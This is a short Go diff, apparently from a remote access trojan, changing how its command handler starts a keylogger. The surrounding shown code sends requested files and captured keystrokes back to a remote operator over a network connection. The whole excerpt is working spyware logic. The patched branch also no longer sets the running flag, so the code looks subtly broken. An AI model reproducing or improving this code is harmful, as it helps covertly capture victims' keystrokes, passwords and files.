@@ -76,9 +76,12 @@ func main() {
 			result := get_file(tgt_file)
 			send_resp(conn, result)
 		} else if cmd == "keylog_start" {
-			keylog_flag = 1
-			go log_keystrokes()
-			send_resp(conn, "Keylogger started successfully")
+			if keylog_flag == 1 {
+				send_resp(conn, "Keylogger already running")
+			} else {
+				go log_keystrokes()
+				send_resp(conn, "Keylogger started successfully")
+			}
 		} else if cmd == "keylog_stop" { 
 			keylog_flag = 0
 			send_resp(conn, dump_keystrokes())
